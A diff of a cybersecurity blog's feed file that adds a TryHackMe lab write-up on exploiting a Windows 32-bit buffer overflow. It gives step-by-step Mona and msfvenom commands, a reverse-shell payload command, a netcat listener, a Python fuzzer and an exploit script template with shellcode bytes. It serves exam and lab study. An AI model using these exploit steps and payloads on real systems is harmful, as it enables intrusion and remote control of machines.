@@ -1,4 +1,294 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-03-15T00:09:38-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">Dice Roll</title><link href="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll.html" rel="alternate" type="text/html" title="Dice Roll" /><published>2021-03-14T23:48:00-05:00</published><updated>2021-03-14T23:48:00-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll.html">&lt;h1&gt;&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-06-13T18:28:56-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">Buffer Overflow Prep</title><link href="http://0.0.0.0:4000/writeups/resources/2021/06/13/TryHackMe-BOF-Prep.html" rel="alternate" type="text/html" title="Buffer Overflow Prep" /><published>2021-06-13T16:13:21-05:00</published><updated>2021-06-13T16:13:21-05:00</updated><id>http://0.0.0.0:4000/writeups/resources/2021/06/13/TryHackMe-BOF-Prep</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/resources/2021/06/13/TryHackMe-BOF-Prep.html">&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/THMlogo.png&quot; width=&quot;225&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;11-step-process-for-exploiting-a-windows-32-bit-application-buffer-overflow-&quot;&gt;11 Step Process for Exploiting a Windows 32-Bit Application Buffer Overflow &lt;br /&gt;&lt;/h1&gt;
+
+&lt;h4 id=&quot;procedure-and-worksheet-based-on-material-from-the-tib3rius-buffer-overflow-prep-try-hack-me-room&quot;&gt;(Procedure and Worksheet based on Material from the Tib3rius &lt;a href=&quot;https://tryhackme.com/room/bufferoverflowprep&quot; target=&quot;_blank&quot;&gt;Buffer Overflow Prep&lt;/a&gt; Try Hack Me Room)&lt;/h4&gt;
+
+&lt;h2 id=&quot;table-of-contents&quot;&gt;&lt;a name=&quot;toc&quot;&gt;&lt;/a&gt;Table of Contents&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;#tools&quot;&gt;Tools&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#process&quot;&gt;Process with Example Commands and Output&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#fuzzer&quot;&gt;Python 3 Fuzzer Script Template&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#exploit&quot;&gt;Python 3 Exploit Script Template&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#applications&quot;&gt;List of Example Commands by Application&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#worksheet&quot;&gt;OSCP Friendly Manual BOF Exploit Worksheet&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div style=&quot;page-break-after: always; visibility: hidden&quot;&gt; \pagebreak &lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;tools&quot;&gt;&lt;a name=&quot;tools&quot;&gt;&lt;/a&gt;Tools&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Immunity Debugger with Mona Plugin&lt;/li&gt;
+  &lt;li&gt;Metasploit Framework&lt;/li&gt;
+  &lt;li&gt;Python 3 fuzzer and exploit script templates (found below)&lt;/li&gt;
+  &lt;li&gt;XFreeRDP&lt;/li&gt;
+  &lt;li&gt;Netcat&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;#toc&quot;&gt;Return to Table of Contents&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;div style=&quot;page-break-after: always; visibility: hidden&quot;&gt; \pagebreak &lt;/div&gt;
+
+&lt;h2 id=&quot;process-with-example-commands-and-output&quot;&gt;&lt;a name=&quot;process&quot;&gt;&lt;/a&gt;Process with Example Commands and Output&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 1&lt;/strong&gt; - Open an RDP session to the target machine, if applicable then run the vulnerable application and fuzz to find the general range of the EIP register offset at the point of the application crashing.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp /u:admin /p:password /cert:ignore /v:10.10.11.33 /workarea&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 fuzzer.py&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 2&lt;/strong&gt; - Create a pattern that’s 400 characters over the estimated offset via metasploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 3&lt;/strong&gt; - Modify exploit script with the target ip and port, pattern as the payload, offset = 0, retn = “”, padding = “”, postfix = “”.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 4&lt;/strong&gt; - Open Immunity Debugger (running as admin) and load the vulnerable application, then use Mona to find the exact EIP offset.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona findmsp -distance 1100&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/BOFPrep/076f8fddebb340d0bd9c788ecade2743.png&quot; alt=&quot;91eed7279aec31c58183ac4f1d1b56d3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 5&lt;/strong&gt; - Verify the offset value by updating and running exploit.py with no payload, the found offset value, and a return address string (“e.g. BCDE”) to check for EIP overwrite.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/BOFPrep/55c279c6b2724a61973b20832f27ebd0.png&quot; alt=&quot;bce6ef0f3b0529f9ad73f69fe5074110.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 6&lt;/strong&gt; - Use Mona to generate a bad character set, excluding \x00, update exploit.py then run it, noting the ESP register value.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona config -set workingfolder c:\mona\%p&lt;/code&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona bytearray -b &quot;\x00&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/BOFPrep/8ef8c60148f9480e98a83849f2bc1f4b.png&quot; alt=&quot;911f323f12a625db489113b17199229a.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 7&lt;/strong&gt; - Use Mona to find possible bad characters with a comparison between the byte array and ESP.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona compare -f C:\mona\oscp\bytearray.bin -a 0192FA30&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 8&lt;/strong&gt; - Update the byte array and payload to exclude all possible bad characters, then run the exploit followed by a Mona comparison to find bad characters.  Remove identified bad characters (ignoring the second of adjacent bytes that are flagged as bad, as this may not be the case) and repeat the process until all bad characters have been eliminated.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/BOFPrep/92ad0e178a52488cbb8131f1d5c37a28.png&quot; alt=&quot;5792de7cc1861f92bb50d7d596a32401.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona bytearray -b &quot;\x00\x11\x40\x5f\xb8\xee&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona compare -f C:\mona\oscp\bytearray.bin -a 017CFA30&lt;/code&gt; (Update the ESP address after each crash)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/BOFPrep/3dfe0c17cab748fbbd4a848a9a6ae22d.png&quot; alt=&quot;0d6965704c28259558dd0dd352f5e571.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 9&lt;/strong&gt; - Find a JMP point using Mona and update the RETN variable in the exploit script accordingly.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona jmp -r esp -cpb &quot;\x00\x11\x40\x5f\xb8\xee&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/BOFPrep/4067cd8d3e8f4249ab4b7cc32db2f634.png&quot; alt=&quot;5f1b0a5b192ec6f30b3bed16b0b1c387.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;retn = &quot;\x03\x12\x50\x62&quot;&lt;/code&gt; (Little Endian)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 10&lt;/strong&gt; - Generate an MSF reverse shell payload (excluding all bad characters identified) and replace the payload value in exploit.py, along with NOP (\x90) padding of at least 16 bytes.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b &quot;\x00\x11\x40\x5f\xb8\xee&quot; -f c&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Step 11&lt;/strong&gt; - Open up a Netcat listener and run the exploit for reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/BOFPrep/5b5558e9b28244c69fac2f0b73b994cc.png&quot; alt=&quot;49f1b60f4a406df4a7ec27ae5e868cc0.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;#toc&quot;&gt;Return to Table of Contents&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;div style=&quot;page-break-after: always; visibility: hidden&quot;&gt; \pagebreak &lt;/div&gt;
+
+&lt;h2 id=&quot;list-of-example-commands-by-application&quot;&gt;&lt;a name=&quot;applications&quot;&gt;&lt;/a&gt;List of Example Commands by Application&lt;/h2&gt;
+
+&lt;h3 id=&quot;rdp&quot;&gt;RDP:&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp /u:admin /p:password /cert:ignore /v:10.10.11.33 /workarea&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;metasploit&quot;&gt;Metasploit:&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;mona&quot;&gt;Mona:&lt;/h3&gt;
+&lt;p&gt;Set Working Folder Path - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona config -set workingfolder c:\mona\%p&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Find EIP offset - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona findmsp -distance 1100&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Generate a Byte Array Excluding Bad Chars - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona bytearray -b &quot;\x00\x09&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Find Bad Characters - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Find JMP ESP spots Excluding Bad Chars - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona jmp -r esp -cpb &quot;\x00\x23\x24\x3c\x3d\x83\x84\xba\xbb&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Generate a Shellscript Excluding Bad Chars - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b &quot;\x00\x23\x3c\x83\xba&quot; -f c&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;basic-netcat-listener-for-reverse-shell&quot;&gt;Basic Netcat Listener for Reverse Shell:&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;#toc&quot;&gt;Return to Table of Contents&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;div style=&quot;page-break-after: always; visibility: hidden&quot;&gt; \pagebreak &lt;/div&gt;
+
+&lt;h2 id=&quot;python-3-fuzzer-script-template&quot;&gt;&lt;a name=&quot;fuzzer&quot;&gt;&lt;/a&gt;Python 3 Fuzzer Script Template&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;10.10.98.22&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;OVERFLOW2 &quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# This specific input is necessary for the THM room exercises
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fuzzing with {} bytes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;latin-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fuzzing crashed at {} bytes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;a href=&quot;#toc&quot;&gt;Return to Table of Contents&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;div style=&quot;page-break-after: always; visibility: hidden&quot;&gt; \pagebreak &lt;/div&gt;
+
+&lt;h2 id=&quot;python-3-exploit-script-template&quot;&gt;&lt;a name=&quot;exploit&quot;&gt;&lt;/a&gt;Python 3 Exploit Script Template&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;10.10.98.22&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;OVERFLOW2 &quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# This specific input is necessary for the THM room exercises
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;634&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;retn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xaf\x11\x50\x62&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xfc\xbb\x17\x74\x72\x5e\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xeb\x9c\xf0\x5e\x13&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x48\xf4\xd4\x90\x6e\x0a\xd7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;postfix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;postfix&lt;/span&gt;
+
